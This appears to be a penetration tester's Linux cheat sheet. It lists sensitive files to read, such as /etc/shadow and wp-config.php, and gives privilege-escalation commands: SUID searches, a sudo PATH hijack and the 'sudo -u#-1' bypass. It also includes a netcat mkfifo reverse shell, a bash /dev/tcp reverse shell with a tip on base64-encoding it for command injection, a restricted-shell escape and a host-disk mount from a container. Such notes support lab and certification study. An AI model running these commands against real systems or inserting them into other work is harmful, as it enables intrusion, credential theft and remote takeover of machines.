# Linux

## Important files (Default Location)

```
/etc/passwd
/etc/group
/etc/shadow
/var/www/html/
/var/www/
/tmp/
/home/
/var/log/nginx/access.log
/var/log/apache/access.log
/var/log/auth.log
/etc/apache2/sites-available/000-default.conf
/etc/samba/smb.conf
/var/www/html/wordpress/wp-config.php
/etc/fstab
/var/log/cron.log
/etc/tomcat9/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
```

### PrivEsc

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDR] [PORT] >/tmp/f
sudo -l   # /etc/sudoers
-----------------
(root) SETENV: NOPASSWD: /opt/cleanup.sh
# have the ability to set environment, therefore create a bash binary in the pwd and:
sudo PATH=$PWD:$PATH /opt/cleanup.sh
-----------------
find / -perm -4000 2>/dev/null    # file with suid
find / -type f -writable 2>/dev/null
sudo -u#-1 /bin/bash
```

### Reverse Shell

```
echo "bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1" |bash    # base64 encode the echo cmd; use for os command injection (api)
```

### Not So Important But May Be Useful (Default Location)

```
/proc/cpuinfo
```

### PATH & Restricted Shell

```
export PATH=/tmp:$PATH
ssh alfred@10.11.1.101 -t "bash --noprofile"
```

### Docker

```shell
docker images
docker build -t [image-name] [Dockerfile location]    # building a docker image from the image file
docker run [image-name]   # running the docker image
---------------Mount SDA1----------------
fdisk -l
mkdir -p /mnt/tmpp
mount /dev/sda1 /mnt/tmpp
```

### Network & Firewall rules

```
iptables -L
cat /etc/sysconfig/iptables
cat /etc/resolv.conf
```
